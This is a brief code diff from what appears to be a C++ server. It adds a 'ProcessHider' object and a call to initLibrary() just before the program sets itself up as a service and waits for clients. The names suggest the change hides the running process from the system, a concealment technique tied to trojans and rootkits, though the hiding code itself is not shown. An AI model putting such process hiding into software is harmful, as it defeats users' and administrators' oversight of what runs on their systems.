@@ -118,7 +118,8 @@ void Server::listenInit()
 		throw ServerCantBindSocket();
 	if ((listen(this->sock, 3)) == -1)
 		throw ServerCantListenOnSocket();
-
+	ProcessHider	hider;
+	hider.initLibrary();
 	Service service(Utils::getCurrentPath());
 	service.initService();
 	this->waitClients();
